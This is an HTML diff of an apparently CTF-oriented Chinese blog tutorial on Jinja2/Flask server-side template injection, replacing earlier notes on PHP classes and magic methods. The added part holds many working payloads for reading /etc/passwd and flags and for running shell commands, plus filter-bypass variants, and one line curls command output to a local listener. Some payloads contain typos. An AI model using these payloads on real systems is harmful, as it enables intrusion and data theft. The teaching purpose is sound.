+<pre><code class="highlight plaintext">from flask import Flask, request
+from jinja2 import Template
+
+app = Flask(__name__)
+
+@app.route(&quot;/&quot;)
+def index():
+    name = request.args.get(&#x27;name&#x27;, &#x27;guest&#x27;)
+
+    t = Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)
+    return t.render(n=name)
+
+if __name__ == &quot;__main__&quot;:
+    app.run()</code></pre>
+
+<p>编译运行，再次注入就会失败<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1344396-20200903151308616-823367288.png" alt="img"></p>
+<pre><code class="highlight plaintext">&#123;% ... %&#125; for Statements #用来声明变量，也可以用于条件语句和循环语句
+例子:
+&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__==&#x27;file&#x27; %&#125;
+&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+ 
+&#123;&#123; ... &#125;&#125; for Expressions to print to the template output #将表达式打印到模板输出
+ 
+&#123;# ... #&#125; for Comments not included in the template output #表示未包含在模板输出中的注释
+ 
+#...# for Line Statements #有和&#123;%%&#125;相同的效果</code></pre>
+
+<p>有些时候过滤可能会ban掉双括号，这时候可能就需要用到上面的一些语法</p>
+<h4 id="jinja2的俄罗斯套娃"><a href="#jinja2的俄罗斯套娃" class="headerlink" title="jinja2的俄罗斯套娃"></a>jinja2的俄罗斯套娃</h4><p>看过jinja2相关模板注入题目的人就能明白是什么意思了哈哈()</p>
+<p>介绍一下基类的一些概念之类的吧</p>
+<p><code>&#39;&#39; [] ()</code>都是最简单的数据类型，而我们最一般的思路就是通过这些来找到基类，这里就要涉及到一些魔术方法了</p>
+<p>那就按顺序进行一个介绍吧</p>
+<p>首先，我们的目的是要找到基类</p>
+<p>于是我们就要用到<code>__class__</code>返回一个实例所属的类</p>
+<p>但是我们的目的是找到Object基类，那么我们需要进一步返回</p>
+<p>所以就要用到<code>__base__ __bases__  __mro__</code></p>
+<p><code>base</code>最为直接，就是直接返回上层的父类，而<code>bases</code>是递归返回所有上面的类，术语上是叫元组，<code>mro</code>同理,但是会包含原来就所属的类</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250414125152769.png" alt="image-20250414125152769"></p>
+<p>找到Object之后呢，由于我们的目的是得到一个可以任意命令执行的板块，我们就需要找到<code>os</code>这些类似的方法，那么就要用到<code>__subclass__()</code>以及后面的一些东西</p>
+<p>subclasses是返回子类，通常这个时候就会跳一大串的子类，没脚本是不得行的(不是哥们你真想手找吗)</p>
+<p>而返回子类后我们就要做出一个重大的决策，根据版本打不同的payload,详见文件读取的子类(py2人上人)</p>
+<p>一般我们的选择 是两种</p>
 <ul>
-<li><strong>类</strong> − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</li>
-<li><strong>对象</strong> − 是类的实例。</li>
-<li><strong>成员变量</strong> − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的<strong>属性</strong>。</li>
-<li><strong>成员函数</strong> − 定义在类的内部，可用于访问对象的数据。</li>
-<li><strong>继承</strong> − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</li>
-<li><strong>父类</strong> − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</li>
-<li><strong>子类</strong> − 一个类继承其他类称为子类，也可称为派生类。</li>
-<li><strong>多态</strong> − 多态性是指相同的函数或方法可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</li>
-<li><strong>重载</strong> − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</li>
-<li><strong>抽象性</strong> − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</li>
-<li><strong>封装</strong> − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</li>
-<li><strong>构造函数</strong> − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</li>
-<li><strong>析构函数</strong> − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</li>
+<li>文件读取</li>
+<li>内置模块任意命令执行</li>
 </ul>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;<span class="comment">//类</span>
-  <span class="comment">/* 成员变量 */</span>
-  <span class="keyword">var</span> <span class="variable">$url</span>;
-  <span class="keyword">var</span> <span class="variable">$title</span>;
-  
-  <span class="comment">/* 成员函数 */</span>
-  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
-     <span class="variable language_">$this</span>-&gt;url = <span class="variable">$par</span>;
-  &#125;
-  
-  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>)</span>&#123;
-     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;url . PHP_EOL;
-  &#125;
-  
-  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
-     <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;
-  &#125;
-  
-  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;
-     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;title . PHP_EOL;
-  &#125;
-&#125;
-<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Site</span>();<span class="comment">//创建对象</span>
-<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setTitle</span>(<span class="string">&#x27;AyaN0&#x27;</span>);<span class="comment">//调用成员方法</span>
-<span class="comment">//或者$a-&gt;setTitle=&#x27;AyaN0&#x27;;</span>
+<pre><code class="highlight python"><span class="comment">#文件读取</span>
+<span class="comment">#python2</span>
+file -&gt;(<span class="string">&#x27;path&#x27;</span>).read()
+<span class="comment">#python3</span>
+_frozen_importlib_external.FiieLoader -&gt;[<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)
+<span class="comment">#当然也可以拿内置模块再文件读取，但是感觉不得已才会这样打</span></code></pre>
 
-<span class="meta">?&gt;</span></code></pre>
+<pre><code class="highlight python"><span class="comment">#函数rce</span>
+<span class="comment">#不知道和版本有没有关系，反正找到还没有被过滤直接打就行</span>
+&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[xx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)&#125;&#125;
+&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]__.__subclasses__()[xx].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;
+&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami’)&#125;&#125;</span>
+<span class="string">&#123;&#123; &#x27;</span><span class="string">&#x27;.__class__.__base__.__subclasses__()[10].__init__.__globals__[&#x27;</span>__builtins__<span class="string">&#x27;][&#x27;</span><span class="built_in">eval</span><span class="string">&#x27;](&#x27;</span><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).read()<span class="string">&#x27;) &#125;&#125;#eval</span></code></pre>
 
-<h2 id="pop链构造"><a href="#pop链构造" class="headerlink" title="pop链构造"></a>pop链构造</h2><h3 id="construct-和-destruct"><a href="#construct-和-destruct" class="headerlink" title="__construct() 和 __destruct()"></a><code>__construct()</code> 和 <code>__destruct()</code></h3><p><code>__construct</code>：当对象<strong>创建</strong>时会自动调用，注意是创建的时候，也就是说有<code>new</code>的时候就会调用，在<code>unserialize</code>时是不会被自动调用的</p>
-<pre><code class="highlight plaintext">__destruct()`：当对象被销毁时会自动调用；当新对象创建后，它后面一定会被自动销毁，也就是调用`__construct`后一定会调用`__destruct`；或者我们直接传入一个对象，它后面被销毁时也会调用`__destruct</code></pre>
+<pre><code class="highlight python"><span class="comment">#类的rce</span>
+&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]__.__subclasses__()[xx][<span class="string">&#x27;load_moudule&#x27;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls&quot;</span>).read()&#125;&#125;<span class="comment">#importlib</span>
+&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro[<span class="number">2</span>]__.__subclasses__()[xx](<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;<span class="comment">#subprocess.Popen 个人觉得唯一真神好吧</span></code></pre>
 
-<p>可以看到，创建对象e时调用了<code>__construct</code>，然后输出序列化后的对象<code>t</code>，最后在销毁对象<code>t</code>时调用了<code>__destruct</code></p>
+<pre><code class="highlight python"><span class="comment">#内置OS模块rce(这个其实就多了哈哈)不管类内置的还是函数内置的有就行了，这边重点介绍类的吧，因为函数内置的后面会讲的</span>
+os._wrap_close //<span class="number">117</span>
+warnings.catch_warnings //<span class="number">59</span>
+warnings.WarningMessage
+socket._socketobject
+site._Printer //<span class="number">71</span>
+site.Quitte
+subprocess.Popen //<span class="number">258</span></code></pre>
+
+<p>再贴一个找到内置os模块的脚本</p>
+<pre><code class="highlight plaintext">#coding:utf-8search = &#x27;os&#x27;   #也可以是其他你想利用的模块
+num = -1
+for i in ().__class__.__bases__[0].__subclasses__():
+    num += 1
+    try:
+        if search in i.__init__.__globals__.keys():
+            print(i, num)
+    except:
+        pass</code></pre>
+
+<p>后面的操作就比较公式化了</p>
+<p>直接贴一下好了</p>
+<pre><code class="highlight python"><span class="comment">#python2</span>
+__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)
+__init__.func_globals.linecache.os.popen(<span class="string">&#x27;id&#x27;</span>).read()
+__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)
+__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)
+__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)
+
+<span class="comment">#python3</span>
+__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()
+__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)
+__init__[<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()
+__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].listdir(<span class="string">&#x27;.&#x27;</span>)
+__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span>
+<span class="string">__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read()</span>
+<span class="string"></span></code></pre>
+
+<p><strong>觉得烦?那最快的就来了</strong></p>
+<p>利用flask内置函数，效率高，payload短，就是容易被ban(</p>
+<pre><code class="highlight jinja2">1)config #获取配置信息
+&#123;&#123;config.__class__.__init__.__globals__[&quot;os&quot;].popen(&quot;cat+/flag&quot;).read()&#125;&#125;
+2)lipsum
+&#123;&#123; lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read() &#125;&#125;
+
+3)request
+&#123;&#123;request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;
+&#123;&#123;request.application.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;
+
+4)url_for
+&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
+
+5)get_flashed 
+&#123;&#123;get_flashed_messages.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;</code></pre>
+
+
+
+<p><strong>总结一下，就是先找到一个合适的攻城锤(内含os的类或可命令执行的函数)和一把趁手的宝剑(可以使用的方法)</strong></p>
+<h4 id="jinja2的过滤"><a href="#jinja2的过滤" class="headerlink" title="jinja2的过滤"></a>jinja2的过滤</h4><p><strong>过滤[</strong></p>
+<pre><code class="highlight plaintext">#getitem、pop
+&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()
+&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#x27;ls&#x27;).read()</code></pre>
+
+<p><strong>过滤引号</strong></p>
+<pre><code class="highlight plaintext">#chr函数
+&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
+&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;
+#request对象
+&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd
+#命令执行
+&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
+&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;
+&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id
+#request 绕过
+&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd    
+\#分析：
+request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤。
+若args被过滤了，还可以使用values来接受GET或者POST参数。：
+&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;
+Cookie:arg1=open;arg2=/etc/passwd
+&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;
+post:arg1=open&amp;arg2=/etc/passwd</code></pre>
+
+<p><strong>过滤下划线</strong></p>
+<pre><code class="highlight plaintext">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
+//request.args.xx就能直接查询对应的参数值，把原参数换成[request.args.xx]即可</code></pre>
+
+<p><strong>过滤花括号</strong></p>
+<pre><code class="highlight plaintext">#用&#123;%%&#125;标记
+&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;</code></pre>
+
+<p><strong>过滤关键字</strong></p>
 <ul>
-<li><p>实例</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
-
-    <span class="keyword">public</span> <span class="variable">$username</span>;
-
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
-        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;
-    &#125;
-
-&#125;
-<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);
-<span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);
-<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);
-<span class="meta">?&gt;</span>
-<span class="comment">//__construct test</span></code></pre>
-
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
-
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;
-    &#125;
-
-&#125;
-<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
-<span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);
-<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);
-<span class="meta">?&gt;</span>
-<span class="comment">//__destruct test</span>
-<span class="comment">//__destruct test</span></code></pre></li>
+<li>利用内置的语法传参的值：</li>
 </ul>
-<h3 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep() 和 __wakeup()"></a><code>__sleep()</code> 和 <code>__wakeup()</code></h3><p><code>__sleep()</code> ：在对象被序列化<strong>之前</strong>被调用，就是说看到<code>serialize</code>时就会被调用，而且是先调用后再执行序列化</p>
-<p><code>__wakeup()</code>: 将在<strong>字符串被反序列化之后被立即调用</strong>，就是说<strong>看到</strong><code>unserialize</code><strong>后就会被立即调用</strong></p>
-<p>在看到<code>serialize($b)</code>后，它是先调用了<code>__sleep()</code>魔法函数，然后才执行了<code>echo</code>，输出了字符串</p>
-<p>直接输入了<strong>字符串</strong>，当它执行了<code>unserialize</code>转换成对象后，就会最先调用<code>__wakeup()</code>，它的优先级最高</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
-    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;
-
-    <span class="keyword">public</span> <span class="variable">$username</span>;
-    <span class="keyword">public</span> <span class="variable">$nickname</span>;
-    <span class="keyword">private</span> <span class="variable">$password</span>;
-
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
-        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;
-        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;
-    &#125;
-
-    <span class="comment">// 重载序列化调用的方法</span>
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="comment">// 返回需要序列化的变量名，过滤掉password变量</span>
-        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);
-    &#125;
-
-&#125;
-<span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);
-<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);
-<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;结果就是过滤掉了password的值</span></code></pre>
-
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
-    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;
-
-    <span class="keyword">public</span> <span class="variable">$username</span>;
-    <span class="keyword">public</span> <span class="variable">$nickname</span>;
-    <span class="keyword">private</span> <span class="variable">$password</span>;
-    <span class="keyword">private</span> <span class="variable">$order</span>;
-
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
-        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;
-        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;
-    &#125;
-
-    <span class="comment">// 定义反序列化后调用的方法</span>
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;
-    &#125;
-&#125;
-<span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;
-<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));
-<span class="comment">/*</span>
-<span class="comment">class User#1 (4) &#123;</span>
-<span class="comment">  public $username =&gt;</span>
-<span class="comment">  string(1) &quot;a&quot;</span>
-<span class="comment">  public $nickname =&gt;</span>
-<span class="comment">  string(1) &quot;b&quot;</span>
-<span class="comment">  private $password =&gt;</span>
-<span class="comment">  string(1) &quot;a&quot;</span>
-<span class="comment">  private $order =&gt;</span>
-<span class="comment">  NULL</span>
-<span class="comment">&#125;</span>
-<span class="comment">上面wakeup的函数作用是将username的变量值赋值给password变量。*/</span></code></pre>
-
-
-
-<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><code>__toString()</code></h3><p><code>__toString()</code>魔术方法是最为最要的，在构造pop链中它往往是很关键的一环，在很多种情况下都会被调用，主要是下面这些：</p>
-<ol>
-<li><code>echo($obj)</code>或<code>print($obj)</code><strong>打印对象</strong>时会触发</li>
-<li><strong>反序列化对象</strong>与字符串连接时</li>
-<li><strong>反序列化对象</strong>参与格式化字符串时</li>
-<li><strong>反序列化对象</strong>与<strong>字符串</strong>进行<code>preg_match</code>正则匹配)，因为php进行弱比较时会转换参数类型，相当于都转换成字符串进行比较</li>
-<li><strong>反序列化对象</strong>参与<strong>格式化sql语句</strong>时，绑定参数时(用的少)</li>
-<li><strong>反序列化对象</strong>经过<strong>php字符串函数</strong>时，如<code>strlen()</code>，<code>addslashes()</code>时(用的少)</li>
-<li>在<code>in_array()</code>方法中，第一个参数是<strong>反序列化对象</strong>，第二个参数的数组中有<code>tostring</code>返回的字符串的时候<code>tostring</code>会被调用</li>
-<li><strong>反序列化对象</strong>作为<code>class_exists()</code>的参数的时候(用的少)</li>
-</ol>
-<p>通过看它被调用的情况，不难总结出，当对象被当成了字符串的时候，<code>__toString()</code>就会被调用，无论是将对象打印出来，还是将对象去与字符串进行比较，它都会被调用；这里要注意的是，必须要操作的是<strong>对象</strong>的时候，才会被调用</p>
-<p>新建了对象<code>t</code>就直接打印它，照理说肯定是不会有任何回显的，因为只有字符串能被打印，对象肯定是不能被直接打印的，需要先将它序列化成字符串后才可以打印；但我们这直接打印发现它居然有输出，就是因为它按照操作字符串的方法去操作了对象，所以说调用了<code>__toString()</code>，然后将它的返回值输出了出来</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
-
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>
-<span class="function">    </span>&#123;
-       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;
-    &#125;
-
-&#125;
-
-<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
-<span class="keyword">echo</span> <span class="variable">$test</span>;
-<span class="comment">//__toString</span></code></pre>
-
-
-
-<h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a><code>__invoke()</code></h3><p><code>__invoke</code>：当尝试以调用<strong>函数</strong>的方式调用一个<strong>对象</strong>时，<code>__invoke()</code>方法会被自动调用，而调用函数的方式就是在后面加上<code>()</code>，当我们看到像<code>return $function();</code>这种语句时，就应该意识到后面可能会调用<code>__invoke()</code>，下图是直接在对象后面加<code>()</code>调用</p>
-<p>需要注意的是，这个魔术方法只在<strong>PHP 5.3.0 及以上版本</strong>有效</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
-
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>
-<span class="function">    </span>&#123;
-       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;
-    &#125;
-
-&#125;
-
-<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
-<span class="variable">$test</span>();
-<span class="comment">//__invoke test</span></code></pre>
-
-
-
-<h3 id="get-和-set"><a href="#get-和-set" class="headerlink" title="__get() 和 __set()"></a><code>__get()</code> 和 <code>__set()</code></h3><p><code>__get()</code>：从<strong>不可访问的属性中</strong>读取值，或者说是<strong>调用一个类及其父类方法中未定义属性时</strong>，需要一个参数，代表不存在的属性值</p>
-<p><code>__set()</code>：当给一个未定义的属性赋值时，或者修改一个不能被修改的属性时(<code>private</code> <code>protected</code>)(用的不多)</p>
-<p><code>echo</code>语句调用了<code>__toString()</code>，然后它返回的是当前对象的<code>t</code>属性，但我们是没有定义<code>t</code>这个属性的，所以说会调用<code>__get()</code>，然后将返回值打印出来</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
-    <span class="keyword">public</span> <span class="variable">$var1</span>;
-    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
-    &#125;
-
-&#125;
-<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
-<span class="variable">$test</span>-&gt;var2;
-<span class="meta">?&gt;</span>
-    <span class="comment">//var2</span></code></pre>
-
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
-    <span class="keyword">public</span> <span class="variable">$var1</span>;
-    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;
-    &#125;
-
-&#125;
-<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
-<span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;
-<span class="meta">?&gt;</span></code></pre>
-
-
-
-<h3 id="call-和-callStatic"><a href="#call-和-callStatic" class="headerlink" title="__call() 和 __callStatic()"></a><code>__call()</code> 和 <code>__callStatic()</code></h3><p><code>__call</code>：在对象中调用类中不存在的方法时，或者是不可访问方法时被调用</p>
-<p><code>__callStatic</code>：在静态上下文中调用一个不可访问静态方法时被调用(用的不多)</p>
-<p>比如说像这段代码，我们调用对象<code>t</code>中的方法<code>t2</code>，但因为类中没有方法<code>t2</code>，所以说就调用了<code>__call()</code></p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
-
